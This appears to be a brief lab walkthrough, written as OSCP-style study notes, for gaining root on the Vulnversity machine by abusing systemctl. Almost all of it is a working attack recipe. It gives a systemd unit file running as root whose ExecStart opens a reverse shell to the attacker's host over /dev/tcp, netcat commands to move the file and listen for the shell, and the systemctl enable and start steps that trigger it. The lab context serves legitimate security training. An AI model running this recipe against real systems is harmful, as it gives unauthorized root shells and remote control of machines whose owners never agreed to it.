# For better reading experience 
https://alvinsmith.gitbook.io/progressive-oscp/untitled/vulnversity-privilege-escalation

### 0. Prepare your payload `root.service`
```
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KaliIP/9999 0>&1'

[Install]
WantedBy=multi-user.target
```
### 1. Find a files/directories that writable 
```
find / -type f -maxdepth 2 -writable
```
or
```
find / -type d -maxdepth 2 -writable
```
### 2. Transfter the payload(Or just write file there using vi)
###### Init the target listening the port
```
nc -vl 44444 > root.service
```
###### Send file to traget
```
nc -n TargetIP 44444 < root.service
```
### 3. Start listening on the 9999
```
nc -lvnp 9999
```
### 4. Execute the payload(assume the file is under /dev/shm)
```
/bin/systemctl enable /dev/shm/root.service
Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /dev/shm/root.service
Created symlink from /etc/systemd/system/root.service -> /dev/shm/root.service
```
```
/bin/systemctl start root
```
### 5. The nc listening on 9999 would give you the root

Expand Knowlege

https://gtfobins.github.io/gtfobins/systemctl/#suid

https://stackoverflow.com/questions/2491985/find-all-writable-files-in-the-current-directory

https://www.maketecheasier.com/netcat-transfer-files-between-linux-computers/

https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49